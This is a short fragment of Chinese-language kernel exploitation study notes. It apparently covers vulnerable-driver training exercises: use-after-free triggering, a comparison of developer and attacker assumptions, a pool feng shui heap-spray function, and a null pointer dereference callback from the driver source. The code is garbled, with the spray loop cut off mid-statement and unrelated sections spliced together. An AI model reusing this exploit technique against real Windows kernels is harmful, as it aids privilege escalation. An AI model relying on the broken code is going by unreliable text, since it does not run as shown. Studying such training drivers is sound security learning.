    [+] 触发漏洞, 使其重复使用上一次释放的堆
    [+] 利用程序的后面逻辑实现利用
##### 爬坑点
[+] list head:
    [+] target
##### 假设比较
    [+] 开发者假设: callback功能实现完成
    [+] 攻击者假设: 开发者未对数据进行合理的赋值, 可以利用系统特性控制数据实现利用
    [+] who: 开发者失误+系统特性
##### exp
[+] 关键代码段
    VOID poolFengShui()
    {
        WCHAR lpszName[0xf0 / 2] = {};
        memset((char*)lpszName, 'A', 0xf0);
        // 分配大量的0x256个pool
        for (int i = 0; i Callback();
            }
    #else
            DbgPrint("[+] Triggering Null Pointer Dereference\n");
            // Vulnerability Note: This is a vanilla Null Pointer Dereference vulnerability
            // because the developer is not validating if 'NullPointerDereference' is NULL
            // before calling the callback function
            NullPointerDereference->Callback(); // here